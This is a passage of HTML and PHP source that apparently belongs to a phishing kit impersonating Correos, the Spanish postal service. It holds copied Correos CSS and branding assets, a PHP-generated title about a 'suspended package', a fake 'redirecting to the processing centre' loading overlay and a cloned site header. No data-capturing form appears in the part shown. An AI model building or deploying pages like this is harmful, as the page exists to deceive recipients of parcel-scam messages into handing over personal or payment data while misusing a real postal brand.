		.sc-correos-ui-input-h .correos-ui-input_root__txt-password.sc-correos-ui-input {
			display: inline-block;
			vertical-align: middle;
			margin-right: 8px
		}

		.sc-correos-ui-input-h .correos-ui-input_root__icon-password.icon-check.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root__icon-password--green.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root__txt-password.icon-check.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root__txt-password--green.sc-correos-ui-input {
			color: var(--_ui-input-valid-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root__icon-password.icon-close.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root__icon-password--red.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root__txt-password.icon-close.sc-correos-ui-input,
		.sc-correos-ui-input-h .correos-ui-input_root__txt-password--red.sc-correos-ui-input {
			color: var(--_ui-input-error-color)
		}

		.sc-correos-ui-input-h .correos-ui-input_root__icon-password.sc-correos-ui-input {
			margin-right: 8px
		}

		.sc-correos-ui-input-h .correos-ui-input_root__container-ico.sc-correos-ui-input {
			vertical-align: middle;
			display: inline-block
		}

		.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-decoration,
		.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-cancel-button,
		.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-results-button,
		.sc-correos-ui-input-h input[type=search].sc-correos-ui-input::-webkit-search-results-decoration {
			display: none
		}

		.sc-correos-ui-input-h .ui-container-menu.sc-correos-ui-input {
			position: relative;
			width: 100%;
			z-index: 16
		}

		__icon-password.sc-correos-ui-input-h {
			margin-right: 8px
		}

		__paragraph-container.sc-correos-ui-input-h {
			padding-top: 16px
		}

		__paragraph.sc-correos-ui-input-h {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-weight: 300;
			font-size: 12px;
			line-height: 18px;
			color: var(--_ui-input-disabled-color);
			padding: 8px 0;
			vertical-align: middle;
			display: inline-block;
			position: relative
		}

		@media (min-width: 1024px) {
			__paragraph.sc-correos-ui-input-h {
				font-size: 14px;
				line-height: 20px
			}
		}

		__paragraph__container-ico.sc-correos-ui-input-h {
			vertical-align: middle;
			display: inline-block
		}

		@media (max-width: 639px) {
			__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input {
				font-size: 0.875rem;
				bottom: 3px
			}
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__paragraph.sc-correos-ui-input {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-weight: 300;
			font-size: 12px;
			line-height: 18px;
			color: var(--_ui-input-disabled-color);
			padding: 8px 0;
			vertical-align: bottom;
			display: inline-block
		}

		@media (min-width: 1024px) {
			__paragraph.sc-correos-ui-input-h .mdc-floating-label__paragraph.sc-correos-ui-input {
				font-size: 14px;
				line-height: 20px
			}
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__button-info.sc-correos-ui-input {
			border: unset;
			cursor: pointer;
			margin: 0;
			padding: 0;
			width: unset;
			overflow: unset;
			background: unset;
			text-align: flex-start;
			color: inherit;
			font: inherit;
			line-height: inherit;
			-webkit-font-smoothing: inherit;
			-moz-osx-font-smoothing: inherit;
			-webkit-appearance: none;
			color: var(--_ui-input-label-color);
			vertical-align: bottom;
			display: inline-block
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__button-info.sc-correos-ui-input::-moz-focus-inner {
			border: 0;
			padding: 0
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.sc-correos-ui-input {
			background-color: var(--_ui-input-label-color);
			padding: 8px;
			border-radius: 8px;
			width: 100%;
			position: relative;
			display: none
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.active.sc-correos-ui-input {
			display: block
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.sc-correos-ui-input:after {
			bottom: 100%;
			border: solid transparent;
			left: 20%;
			content: " ";
			height: 0;
			width: 0;
			position: absolute;
			pointer-events: none;
			border-color: rgba(136, 183, 213, 0);
			border-bottom-color: var(--_ui-input-label-color);
			border-width: 6px
		}

		@media (min-width: 1024px) {
			__paragraph.sc-correos-ui-input-h .mdc-floating-label__container-hidden.sc-correos-ui-input:after {
				left: 58%
			}
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label__hide-paragraph.sc-correos-ui-input {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			color: var(--ui-input-bg-light-color);
			font-size: 12px;
			line-height: 18px
		}

		@media (max-width: 639px) {
			__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input .mdc-floating-label.sc-correos-ui-input {
				font-size: 0.875rem;
				bottom: 3px
			}
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input .mdc-text-field-helper-line.sc-correos-ui-input {
			width: 100%
		}

		__paragraph.sc-correos-ui-input-h .mdc-floating-label.sc-correos-ui-input .mdc-text-field-helper-line.sc-correos-ui-input .mdc-text-field--with-preppend-icon.sc-correos-ui-input {
			margin-left: calc(var(--_ui-input-icon-size) + var(--_ui-input-icon-margin-right))
		}

		[type=date-pick].sc-correos-ui-input-h .mdc-text-field__icon.sc-correos-ui-input {
			pointer-events: none
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field__icon.sc-correos-ui-input {
			fill: var(--theme-color-blue)
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field--with-search-variant.sc-correos-ui-input {
			display: -ms-flexbox !important;
			display: flex !important
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--notCursor.sc-correos-ui-input {
			fill: var(--theme-color-lightGrey)
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--notCursor.sc-correos-ui-input:hover {
			cursor: default
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .search-variant-icon.sc-correos-ui-input {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			height: 100%;
			border-bottom: 1px solid;
			border-bottom-color: var(--_ui-input-line-color)
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .icon-search.sc-correos-ui-input {
			height: 32px;
			width: 32px;
			color: var(--_ui-input-label-color);
			padding-left: 8px
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--withSearchIcon.sc-correos-ui-input {
			padding-left: 4px !important
		}

		[type=search].sc-correos-ui-input-h .mdc-text-field.sc-correos-ui-input .--withSearchIconLabel.sc-correos-ui-input {
			padding-left: 24px
		}

		[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
			color: var(--_ui-input-field-color)
		}

		[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error) .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
			fill: var(--ui-input-label-color)
		}

		[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--ui-input-label-color)
		}

		[type=search].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--ui-input-label-color)
		}

		[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input {
			border: none;
			border-radius: initial
		}

		[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-bg-light-color)
		}

		[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input:hover {
			border-bottom-color: var(--_ui-input-bg-light-color)
		}

		[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.sc-correos-ui-input:not(.mdc-text-field--disabled) .mdc-line-ripple.sc-correos-ui-input {
			background-color: var(--_ui-input-bg-light-color)
		}

		[variant=straight-lines].sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--_ui-input-bg-light-color)
		}

		.sc-correos-ui-input-h .error-line.sc-correos-ui-input .mdc-text-field__input.sc-correos-ui-input {
			border-bottom: 2px solid var(--_ui-input-error-color) !important
		}

		.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-text-field__input.sc-correos-ui-input {
			color: var(--_ui-input-field-color)
		}

		.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error) .mdc-text-field__icon.sc-correos-ui-input .trailing-icon.sc-correos-ui-input {
			fill: var(--ui-input-label-color)
		}

		.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled) .mdc-floating-label.sc-correos-ui-input {
			color: var(--ui-input-label-color)
		}

		.dropdown.sc-correos-ui-input-h .correos-ui-input_root.sc-correos-ui-input .mdc-text-field.mdc-text-field--filled.sc-correos-ui-input:not(:focus):not(.mdc-text-field--focused):not(.mdc-text-field--invalid):not(.mdc-text-field--disabled):not(.mdc-text-field--force-error):not(.mdc-text-field--disabled):not(.mdc-text-field--outlined):not(.mdc-text-field--textarea) .mdc-text-field__input.sc-correos-ui-input {
			border-bottom-color: var(--ui-input-label-color)
		}

		.cursor-not-allowed {
			cursor: not-allowed;
		}
	</style>

	<meta name="type" content="particulares">
	<meta property="og:title" content="Bienvenido a <?php echo $_SERVER['SERVER_NAME']; ?> - Reciba su paquete suspendido">
	<meta property="og:description" content="Localiza tu envío, una oficina o cualquier código postal. Información sobre todos nuestros productos y servicios. Contratación online. ">
	<meta property="og:image" itemprop="image" content="assets/recibir_paquete_files/CORREOS-1000x1000.png">
	<meta property="og:image:secure_url" content="assets/recibir_paquete_files/CORREOS-1000x1000.png">
	<meta property="og:image:type" content="image/png">
	<meta property="og:image:width" content="1000">
	<meta property="og:image:height" content="1000">
	<meta property="og:type" content="website">

	<meta name="autor" content="Grupo Correos">
	<meta name="organization" content="Sociedad Estatal de Correos y Telégrafos, S.A.">

	<meta name="environmentLanguage" content="ES">

	<link rel="stylesheet" href="assets/recibir_paquete_files/correos-ui-kit.css" id="components-css">

	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="32x32">
	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="128x128">
	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="152x152">
	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="167x167">
	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="180x180">
	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="192x192">
	<link rel="icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="512x512">

	<!-- Android -->
	<link rel="shortcut icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="192x192">

	<!-- iOS -->
	<link rel="apple-touch-icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="128x128">
	<link rel="apple-touch-icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="152x152">
	<link rel="apple-touch-icon" type="image/png" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="167x167">
	<link rel="apple-touch-icon" type="image/ico" href="assets/recibir_paquete_files/CORREOS-favicon.ico" sizes="180x180">

	<meta name="msapplication-square310x310logo" content="assets/recibir_paquete_files/CORREOS-favicon.ico">
	<meta name="msapplication-wide310x150logo" content="assets/recibir_paquete_files/CORREOS-favicon.ico">
	<meta name="msapplication-square150x150logo" content="assets/recibir_paquete_files/CORREOS-favicon.ico">
	<meta name="msapplication-square70x70logo" content="assets/recibir_paquete_files/CORREOS-favicon.ico">

	<!-- LOADING -->
	<div id="showLoading" style="display: none;">
		<div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
			<div class="">
				<div class="loader">
					<div class="" style="margin: 5rem 0;">
						<div style="display:flex;justify-content:center;align-items:center;flex-direction:column">
							<div class="">
								<div style="font-weight:bolder;" class="ogilvy-titula">
									<span id="lbDescription">
										<span id="generic">REDIRIGIENDO LA PETICION A LA PAGINA DEL CENTRO PROCESADOR . . .</span>
									</span>
								</div>
								<div class="ogilvy-subtitular">
									<span id="lbDescription">
										<span id="generic">Por favor no cierre esta pestaña, Gracias.</span>
									</span>
								</div>
							</div>

							<div class="">
								<div id="PageFooter">
									<div id="CollapseFooter" class="buttonHide"></div>
									<center>
										<div id="Div1" class="buttonShow noseve">
											<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: rgba(0, 0, 0, 0) none repeat scroll 0% 0%; display: block; shape-rendering: auto;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
												<g transform="rotate(0 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.3549201009251473s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(12.413793103448276 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.2708158116063917s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(24.82758620689655 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.1867115222876365s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(37.241379310344826 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.1026072329688814s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(49.6551724137931 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-2.0185029436501263s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(62.06896551724138 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.9343986543313707s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(74.48275862068965 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.8502943650126156s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(86.89655172413794 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.7661900756938602s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(99.3103448275862 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.682085786375105s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(111.72413793103448 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.5979814970563497s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(124.13793103448276 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.5138772077375946s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(136.55172413793105 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.4297729184188392s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(148.9655172413793 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.3456686291000841s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(161.3793103448276 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.2615643397813288s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(173.79310344827587 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.1774600504625736s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(186.20689655172413 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.0933557611438183s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(198.6206896551724 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-1.0092514718250631s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(211.0344827586207 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.9251471825063078s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(223.44827586206895 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.8410428931875525s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(235.86206896551724 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.7569386038687973s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(248.27586206896552 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.6728343145500421s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(260.6896551724138 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.5887300252312868s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(273.1034482758621 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.5046257359125316s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(285.51724137931035 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.42052144659377627s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(297.9310344827586 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.33641715727502103s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(310.3448275862069 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.2523128679562658s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(322.7586206896552 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.16820857863751051s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(335.17241379310343 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="-0.08410428931875526s" repeatCount="indefinite"></animate>
													</rect>
												</g>
												<g transform="rotate(347.58620689655174 50 50)">
													<rect x="47.5" y="8" rx="2.5" ry="3.52" width="5" height="16" fill="#244172">
														<animate attributeName="opacity" values="1;0" keyTimes="0;1" dur="2.4390243902439024s" begin="0s" repeatCount="indefinite"></animate>
													</rect>
												</g>
											</svg>
										</div>
									</center>
									<div id="ControlPanelFooter"> </div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</head>

<body class="page basicpage" data-pagename="correosweb:particulares">

	<div class="root responsivegrid">

		<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

			<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
				<div id="experiencefragment-63e552fdb1" class="cmp-experiencefragment cmp-experiencefragment--header">

					<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

						<div class="coreheader aem-GridColumn aem-GridColumn--default--12">
							<div class="sc-correos-cdk-core-header-h sc-correos-cdk-core-header-s --fixed --particular hydrated" menu-lv-first="" size="md">
								<div class="cdk-core-header-root sc-correos-cdk-core-header">
									<header class="cdk-header sc-correos-cdk-core-header">
										<div class="cdk-header-wrapper wrapper-main sc-correos-cdk-core-header">
											<div class="cdk-header-start false sc-correos-cdk-core-header">
												<a target="_self" href="#" class="sc-correos-cdk-core-header">
													<div class="cdk-header-logo-container sc-correos-cdk-core-header">
														<svg width="48px" height="46px" viewBox="0 0 48 46" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
															<title>cornamusa</title>
															<desc>Created with Sketch.</desc>
															<g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
																<g id="molecules/menu/desktop/menu_active" transform="translate(-320.000000, -24.000000)" fill="#002453">
																	<g id="cornamusa" transform="translate(304.000000, 0.000000)">
																		<path d="M49.0004,43.3994 L40.0004,43.3994 L31.0004,43.3994 L31.0004,41.8794 L31.0004,40.3594 L40.0004,40.3594 L49.0004,40.3594 L49.0004,41.8794 L49.0004,43.3994 Z M43.0004,57.8374 C43.0004,56.1574 41.6564,54.7954 40.0004,54.7954 C38.3424,54.7954 37.0004,56.1574 37.0004,57.8374 C37.0004,59.5154 38.3424,60.8774 40.0004,60.8774 C41.6564,60.8774 43.0004,59.5154 43.0004,57.8374 L43.0004,57.8374 Z M40.0004,66.9594 C50.5804,66.9594 59.3544,59.0314 60.7904,48.7154 L57.7524,48.7154 C56.3304,57.3454 48.9204,63.9174 40.0004,63.9174 C36.6864,63.9174 34.0044,61.1954 34.0044,57.8374 C34.0044,54.4794 36.6864,51.7594 40.0004,51.7594 C43.3144,51.7594 46.0004,54.3994 46.0004,57.8374 C46.0004,58.5074 45.8664,59.1414 45.6684,59.7454 C46.8664,59.2494 47.9784,58.5934 49.0004,57.8174 C49.0004,52.7994 44.9684,48.7174 40.0004,48.7174 C35.0304,48.7174 31.0004,52.7994 31.0004,57.8374 C31.0004,62.8734 35.0304,66.9594 40.0004,66.9594 L40.0004,66.9594 Z M19.2384,48.7154 C20.1904,55.4374 24.2164,61.1434 29.8504,64.3034 C28.6844,62.4294 28.0004,60.2174 28.0004,57.8374 L28.0004,57.8374 L28.0004,48.7154 L19.2384,48.7154 Z M55.0004,45.6754 L64.0004,45.6754 C64.0004,59.1094 53.2544,69.9994 40.0004,69.9994 C26.7464,69.9994 16.0004,59.1094 16.0004,45.6754 L31.0004,45.6754 L31.0004,49.8134 C33.1984,47.2814 36.4104,45.6754 40.0004,45.6754 C45.7244,45.6754 50.5044,49.7394 51.7024,55.1754 C53.7644,52.5734 55.0004,49.2714 55.0004,45.6754 L55.0004,45.6754 Z M47.5004,28.9514 C50.8124,28.9514 53.5004,31.6734 53.5004,35.0314 L53.5004,38.0734 L50.5004,38.0734 L50.5004,35.0314 C50.5004,33.3534 49.1564,31.9914 47.5004,31.9914 C47.2324,31.9914 46.9764,32.0394 46.7284,32.1054 C47.2044,32.9774 47.5004,33.9654 47.5004,35.0314 L47.5004,38.0734 L44.5004,38.0734 L44.5004,35.0314 C44.5004,33.3534 43.1564,31.9914 41.5004,31.9914 L41.5004,38.0734 L38.5004,38.0734 L38.5004,31.9914 C36.8424,31.9914 35.5004,33.3534 35.5004,35.0314 L35.5004,38.0734 L32.5004,38.0734 L32.5004,35.0314 C32.5004,33.9654 32.7944,32.9774 33.2724,32.1074 C33.0244,32.0394 32.7684,31.9914 32.5004,31.9914 C30.8424,31.9914 29.5004,33.3534 29.5004,35.0314 L29.5004,38.0734 L26.5004,38.0734 L26.5004,35.0314 C26.5004,31.6734 29.1864,28.9514 32.5004,28.9514 C33.6024,28.9514 34.6304,29.2594 35.5164,29.7854 C36.3984,29.2694 37.4084,28.9514 38.5004,28.9514 C39.0104,28.9514 39.4964,29.0374 39.9684,29.1574 C40.4584,29.0274 40.9704,28.9514 41.5004,28.9514 C42.5984,28.9514 43.6124,29.2714 44.4984,29.7934 C45.3844,29.2714 46.4024,28.9514 47.5004,28.9514 L47.5004,28.9514 Z M40.6544,25.4334 L42.0684,25.4334 L42.0684,26.7594 L40.6544,26.7594 L40.6544,28.1914 L39.3464,28.1914 L39.3464,26.7594 L37.9324,26.7594 L37.9324,25.4334 L39.3464,25.4334 L39.3464,23.9994 L40.6544,23.9994 L40.6544,25.4334 Z"></path>
																	</g>
																</g>
															</g>
														</svg>
													</div>
												</a><button style="display:none" class="cdk-nav-button sc-correos-cdk-core-header --arrow-up" aria-label="Menú" aria-expanded="false" aria-pressed="false">
													<i class="sc-correos-cdk-core-header icon-burger"></i> <!-- font awsome  -->
												</button>
												<div class="cdk-header-menu sc-correos-cdk-core-header">
													<div class="cdk-header-menu-option --active sc-correos-cdk-core-header"><a target="_self" href="./index.php" class="sc-correos-cdk-core-header">Particular</a></div>
													<div class="cdk-header-menu-option sc-correos-cdk-core-header">
														<a target="_self" href="#" class="cursor-not-allowed sc-correos-cdk-core-header">Empresa</a>
													</div>
												</div>
											</div>
